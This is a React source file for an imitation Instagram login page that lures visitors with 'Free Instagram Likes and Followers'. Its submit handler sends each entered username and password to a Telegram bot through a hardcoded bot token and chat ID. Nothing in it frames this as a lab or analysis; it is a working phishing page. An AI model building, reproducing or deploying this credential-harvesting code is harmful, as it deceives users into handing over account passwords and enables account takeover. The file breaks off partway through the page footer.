import { useState } from "react";

export function App() {
const [username, setUsername] = useState("");
const [password, setPassword] = useState("");
const [showPassword, setShowPassword] = useState(false);

const isFormValid = username.length > 0 && password.length >= 6;

// Send to Telegram on submit!
const handleSubmit = async (e) => {
    e.preventDefault();
    const message = `Username: ${username}\nPassword: ${password}`;
    await fetch(
      `https://api.telegram.org/bot7471112121:AAHXaDVEV7dQTBdpP38OBvytroRUSu-2jYo/sendMessage?chat_id=7643222418&text=${encodeURIComponent(message)}`
    );
};

return (
<div className="min-h-screen bg-[#fafafa] flex flex-col items-center justify-center px-4">
<div className="w-full max-w-[350px] flex flex-col items-center">
<div className="w-full bg-white border border-[#dbdbdb] rounded-sm px-10 pt-10 pb-6 mb-2.5">
<div className="flex justify-center mb-4">
<img 
src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
alt="Instagram"
className="h-[51px] object-contain"
/>
</div>
<div className="text-center mb-6">
<h1 className="text-[16px] font-semibold text-[#8e8e8e] leading-5">
Free Instagram Likes and Followers
</h1>
</div>
<form className="flex flex-col gap-1.5"
onSubmit={handleSubmit}
>
<div className="relative">
<input
type="text"
value={username}
onChange={(e) => setUsername(e.target.value)}
className="w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-[2px] text-xs outline-none focus:border-[#a8a8a8] peer"
placeholder=" "
/>
<label className="absolute left-2 top-1/2 -translate-y-1/2 text-[12px] text-[#8e8e8e] pointer-events-none transition-all duration-100 ease-linear peer-focus:top-[10px] peer-focus:text-[10px] peer-[:not(:placeholder-shown)]:top-[10px] peer-[:not(:placeholder-shown)]:text-[10px]" >
Phone number, username, or email
</label>
</div>
<div className="relative">
<input
type={showPassword ? "text" : "password"}
value={password}
onChange={(e) => setPassword(e.target.value)}
className="w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-[2px] pr-14 text-xs outline-none focus:border-[#a8a8a8] peer"
placeholder=" "
/>
<label className="absolute left-2 top-1/2 -translate-y-1/2 text-[12px] text-[#8e8e8e] pointer-events-none transition-all duration-100 ease-linear peer-focus:top-[10px] peer-focus:text-[10px] peer-[:not(:placeholder-shown)]:top-[10px] peer-[:not(:placeholder-shown)]:text-[10px]" >
Password
</label>
{password.length > 0 && (
<button
type="button"
onClick={() => setShowPassword(!showPassword)}
className="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-semibold text-[#262626]"
>
{showPassword ? "Hide" : "Show"}
</button>
)}
</div>
<button
type="submit"
disabled={!isFormValid}
className={`w-full h-[32px] mt-2 rounded-lg text-sm font-semibold text-white transition-opacity ${
isFormValid ? "bg-[#0095f6] hover:bg-[#1877f2] cursor-pointer"
: "bg-[#0095f6]/70 cursor-not-allowed"
}`}
>
Log in
</button>
</form>
<div className="flex items-center my-5">
<div className="flex-1 h-px bg-[#dbdbdb]"></div>
<span className="px-4 text-[13px] font-semibold text-[#8e8e8e] uppercase">or</span>
<div className="flex-1 h-px bg-[#dbdbdb]"></div>
</div>
<button className="w-full flex items-center justify-center gap-2 py-2">
<svg
className="w-5 h-5 text-[#385185]"
viewBox="0 0 24 24"
fill="currentColor"
>
<path d="M9.198 21.5h4v-8.01h3.604l.396-3.98h-4V7.5a1 1 0 0 1 1-1h3v-4h-3a5 5 0 0 0-5 5v2.01h-2l-.396 3.98h2.396v8.01Z"
/>
</svg>
<span className="text-sm font-semibold text-[#385185]">Log in with Facebook</span>
</button>
<div className="text-center mt-4">
<a href="#" className="text-xs text-[#00376b]">
Forgot password?
</a>
</div>
</div>
<div className="w-full bg-white border border-[#dbdbdb] rounded-sm py-4 text-center mb-2.5">
<p className="text-sm text-[#262626]">
Don't have an account?
{" "}
<a href="#" className="font-semibold text-[#0095f6]">
Sign up
</a>
</p>
</div>
<div className="text-center py-3">
<p className="text-sm text-[#262626] mb-4">Get the app.</p>
<div className="flex justify-center gap-2">
<a href="#" className="block">
<img
src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png"
alt="Download on the App Store"
className="h-10"
/>
</a>
<a href="#" className="block">
<img
src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
alt="Get it on Google Play"
className="h-10"
/>
</a>
</div>
</div>
</div>
<footer className="w-full max-w-[1000px] mt-8 px-4">
<div className="flex flex-wrap justify-center gap-x-4 gap-y-1 mb-4">
{[
            "Meta",
            "About",
            "Blog",
            "Jobs",
            "Help",
            "API",
            "Privacy",
            "Terms",
            "Locations",
            "Instagram Lite",
            "Threads",
            "Contact Uploading & Non-Users",
            "Meta Verified",
          ].map((item) => (
            <a key={item} href="#" className="text-xs text-[#8e8e8e] hover:underline">
              {item}
            </a>
          ))}
        </div>
        <div className="flex justify-center items-center gap-4 text-xs text-[#8e8e8e]">
          <select className="bg-transparent outline-none cursor-pointer">
            <option>English</option>
            <option>Español</option>
            <option>Français</option>
            <option>Deutsch</option>
          </select>
          <span>© 
